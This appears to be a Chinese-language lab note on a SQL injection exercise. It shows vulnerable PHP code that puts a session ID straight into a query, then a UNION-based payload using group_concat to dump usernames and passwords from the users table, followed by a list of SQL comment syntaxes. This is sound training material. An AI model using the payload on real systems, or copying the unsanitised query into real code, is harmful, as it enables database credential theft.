# 目录源码/页面源码
```
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
```



# `$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";`


# payload :`-1' union select 1,group_concat(user,0x3a,password) from users #`
## `-1'` :闭合单引号并让前置查询为空
## `union select 1,...` :联合查询两个字段(第一列填个1占位,第二列放我们要的数据)
## `limit 1`限制 :只会回显第一行数据;用`group_concat()`把多行数据拼成一行来绕过limit 1

# `group_concat()` :聚合函数;作用是将多行数据串起来,拼接成一个单一的字符串(默认用,分隔) 

# 注释符
## `--(空格)`
## `--+`
## `#`或`%23`
## `/*!...*/` :内联注释
## `/*...*/` :万能块注释符